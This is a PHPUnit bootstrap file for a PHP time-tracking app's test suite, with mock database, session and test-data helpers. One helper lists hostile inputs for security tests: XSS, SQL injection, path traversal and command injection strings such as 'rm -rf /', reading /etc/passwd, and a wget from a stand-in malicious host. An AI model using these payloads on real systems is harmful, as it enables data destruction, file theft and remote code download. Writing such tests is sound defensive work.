<?php
/**
 * PHPUnit Bootstrap File
 * Sets up comprehensive test environment and utilities for AZE Gemini Test Suite
 */

// Ensure we're in the correct directory
chdir(__DIR__ . '/..');

// Auto-load vendor dependencies if composer is used
if (file_exists(__DIR__ . '/../vendor/autoload.php')) {
    require_once __DIR__ . '/../vendor/autoload.php';
}

// Set up error reporting for tests
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

// Set timezone for consistent date/time testing
date_default_timezone_set('Europe/Berlin');

// Define test constants
define('TEST_MODE', true);
define('TEST_BASE_PATH', __DIR__ . '/..');
define('API_BASE_PATH', TEST_BASE_PATH . '/api');
define('API_GUARD', true);  // Required for including API files

// Mock environment variables for testing
$_ENV['TEST_ENVIRONMENT'] = 'testing';
$_ENV['APP_ENV'] = 'development';
$_ENV['RATE_LIMIT_ENABLED'] = 'true';
$_ENV['CSRF_TOKEN_LIFETIME'] = '3600';

// Include necessary API files for testing (with error handling)
$requiredFiles = [
    API_BASE_PATH . '/constants.php',
    API_BASE_PATH . '/auth_helpers.php'
];

foreach ($requiredFiles as $file) {
    if (file_exists($file)) {
        try {
            require_once $file;
        } catch (Exception $e) {
            // Continue even if some files fail to load
            error_log("Warning: Could not load $file: " . $e->getMessage());
        }
    }
}

// Test database configuration
class TestConfig {
    public static $database = [
        'host' => 'localhost',
        'name' => 'aze_gemini_test',
        'user' => 'test_user',
        'pass' => 'test_pass'
    ];
    
    public static $oauth = [
        'client_id' => 'test-client-id',
        'client_secret' => 'test-client-secret',
        'tenant_id' => 'test-tenant-id'
    ];
}

// Mock session functions for testing
if (!function_exists('start_secure_session')) {
    function start_secure_session() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        return true;
    }
}

// Helper function to create mock HTTP responses
function createMockResponse($data, $statusCode = 200) {
    return [
        'status_code' => $statusCode,
        'data' => $data,
        'headers' => ['Content-Type' => 'application/json']
    ];
}

// Helper function to create test user data
function createTestUser($id = 1, $role = 'Mitarbeiter') {
    return [
        'id' => $id,
        'name' => "Test User $id",
        'username' => "testuser$id",
        'display_name' => "Test User $id",
        'email' => "testuser$id@example.com",
        'role' => $role,
        'location' => 'Test Office',
        'azure_oid' => "test-oid-$id",
        'oid' => "test-oid-$id",
        'created_at' => date('Y-m-d H:i:s')
    ];
}

// Helper function to create test time entry data
function createTestTimeEntry($id = 1, $userId = 1) {
    return [
        'id' => $id,
        'userId' => $userId,
        'username' => "testuser$userId",
        'date' => date('Y-m-d'),
        'startTime' => '09:00:00',
        'stopTime' => '17:00:00',
        'location' => 'Test Office',
        'role' => 'Mitarbeiter',
        'status' => 'Erfasst',
        'reason' => 'Reguläre Arbeitszeit',
        'reasonData' => json_encode([
            'type' => 'work',
            'location' => 'Büro',
            'projectId' => null,
            'customReason' => null
        ]),
        'updatedBy' => "testuser$userId",
        'createdAt' => date('Y-m-d H:i:s'),
        'updatedAt' => date('Y-m-d H:i:s')
    ];
}

// Helper function to create test approval data
function createTestApproval($id = 1, $userId = 1, $entryId = 1) {
    return [
        'id' => $id,
        'userId' => $userId,
        'entryId' => $entryId,
        'requestType' => 'change',
        'requestedChanges' => [
            'startTime' => '08:30:00',
            'stopTime' => '16:30:00'
        ],
        'reason' => 'Korrektur der tatsächlichen Arbeitszeit',
        'status' => 'pending',
        'approvedBy' => null,
        'created_at' => date('Y-m-d H:i:s')
    ];
}

// Helper function to mock database connection
function createMockDatabaseConnection() {
    return (object) [
        'error' => '',
        'insert_id' => 1,
        'affected_rows' => 1,
        'prepare' => function($query) {
            return createMockStatement();
        },
        'close' => function() { return true; }
    ];
}

// Helper function to create mock prepared statement
function createMockStatement() {
    return (object) [
        'bind_param' => function() { return true; },
        'execute' => function() { return true; },
        'get_result' => function() {
            return createMockResult();
        },
        'close' => function() { return true; },
        'error' => '',
        'affected_rows' => 1
    ];
}

// Helper function to create mock result set
function createMockResult() {
    return (object) [
        'num_rows' => 1,
        'fetch_assoc' => function() {
            return createTestTimeEntry();
        },
        'fetch_all' => function($mode) {
            return [createTestTimeEntry()];
        }
    ];
}

// Helper function to reset global state between tests
function resetTestEnvironment() {
    $_SESSION = [];
    $_GET = [];
    $_POST = [];
    $_COOKIE = [];
    
    // Reset server variables to default test state
    $_SERVER = [
        'HTTP_HOST' => 'localhost',
        'REQUEST_METHOD' => 'GET',
        'HTTPS' => 'on',
        'HTTP_ORIGIN' => 'https://aze.mikropartner.de',
        'SCRIPT_NAME' => '/api/test.php',
        'REMOTE_ADDR' => '127.0.0.1'
    ];
}

// Helper function for security testing
function generateSecurityTestData() {
    return [
        'xss_payloads' => [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert(1)',
            '<svg onload="alert(1)">'
        ],
        'sql_injection_payloads' => [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; DELETE FROM users WHERE 1=1; --",
            "admin'--",
            "' UNION SELECT * FROM users--"
        ],
        'path_traversal_payloads' => [
            '../../../etc/passwd',
            '..\\windows\\system32',
            '../config.php',
            '....//....//....//etc/passwd'
        ],
        'command_injection_payloads' => [
            'test; rm -rf /',
            'test | cat /etc/passwd',
            'test && wget malicious.com/script.sh',
            'test`whoami`'
        ]
    ];
}

// Helper function to validate API response structure
function validateApiResponse($response, $expectedFields = []) {
    if (!is_array($response)) {
        return false;
    }
    
    foreach ($expectedFields as $field) {
        if (!array_key_exists($field, $response)) {
            return false;
        }
    }
    
    return true;
}

// Helper function for performance testing
function measureExecutionTime($callback, $iterations = 1000) {
    $startTime = microtime(true);
    
    for ($i = 0; $i < $iterations; $i++) {
        $callback();
    }
    
    $endTime = microtime(true);
    return $endTime - $startTime;
}

// Clean up function for tests
function cleanupTestData() {
    // Clean up temporary files
    $tempDirs = [
        TEST_BASE_PATH . '/cache/rate-limit',
        TEST_BASE_PATH . '/test-temp'
    ];
    
    foreach ($tempDirs as $dir) {
        if (is_dir($dir)) {
            $files = array_diff(scandir($dir), ['.', '..']);
            foreach ($files as $file) {
                $filePath = $dir . '/' . $file;
                if (is_file($filePath)) {
                    unlink($filePath);
                }
            }
        }
    }
    
    // Reset session if active
    if (session_status() === PHP_SESSION_ACTIVE) {
        session_destroy();
    }
}

// Register cleanup function
register_shutdown_function('cleanupTestData');

// Test coverage tracking (simple implementation)
class TestCoverageTracker {
    private static $coveredFiles = [];
    private static $totalFiles = 0;
    
    public static function markFileCovered($filename) {
        self::$coveredFiles[$filename] = true;
    }
    
    public static function setTotalFiles($count) {
        self::$totalFiles = $count;
    }
    
    public static function getCoveragePercent() {
        if (self::$totalFiles === 0) {
            return 0;
        }
        return round((count(self::$coveredFiles) / self::$totalFiles) * 100, 2);
    }
    
    public static function getCoveredFiles() {
        return array_keys(self::$coveredFiles);
    }
}

// Initialize coverage tracking
$coreApiFiles = [
    'auth-middleware.php',
    'rate-limiting.php', 
    'csrf-middleware.php',
    'time-entries.php',
    'users.php',
    'validation.php',
    'auth_helpers.php',
    'db.php',
    'constants.php'
];

TestCoverageTracker::setTotalFiles(count($coreApiFiles));

echo "AZE Gemini Test Suite Bootstrap Loaded\n";
echo "API Base Path: " . API_BASE_PATH . "\n";
echo "Test Mode: " . (TEST_MODE ? 'Enabled' : 'Disabled') . "\n";
echo "Core API Files: " . count($coreApiFiles) . "\n\n";